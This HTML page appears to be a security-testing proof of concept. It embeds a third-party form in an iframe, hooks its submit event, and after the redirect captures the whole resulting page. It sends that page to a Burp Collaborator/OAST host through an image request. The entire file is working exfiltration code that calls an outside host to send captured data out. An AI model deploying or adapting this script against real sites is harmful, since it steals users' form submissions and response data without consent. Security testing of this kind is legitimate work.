<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Load Form and Capture Redirected Response</title>
    <style>
        iframe {
            border: none;
            width: 100%;
            height: 100%;
        }
    </style>
</head>
<body>
    <iframe id="formFrame" src="https://drwhitehack.github.io/Test/"></iframe>
    <script>
        // Function to capture redirected response
        function captureRedirectedResponse(response) {
            // Send the redirected response to the Burp Suite collaborator
            var img = new Image();
            img.src = "http://co4oiq53nckmdhpt89g0rjnkujqxocigt.oast.pro?redirectedResponse=" + encodeURIComponent(response);
        }

        // Function to intercept form submission and capture redirected response
        function interceptFormSubmission() {
            var iframe = document.getElementById('formFrame');
            // Listen for form submission event within the iframe
            iframe.contentWindow.document.querySelector('form').addEventListener('submit', function(event) {
                event.preventDefault(); // Prevent the form from being submitted
                // Perform form submission
                setTimeout(function() {
                    event.target.submit();
                }, 1000); // Adjust the delay as needed
                // Listen for iframe load event after form submission
                iframe.onload = function() {
                    // Capture redirected response
                    var redirectedResponse = iframe.contentDocument.documentElement.outerHTML;
                    captureRedirectedResponse(redirectedResponse);
                };
            });
        }

        // Call the function to intercept form submission when the page loads
        window.onload = function() {
            interceptFormSubmission();
        };
    </script>
</body>
</html>
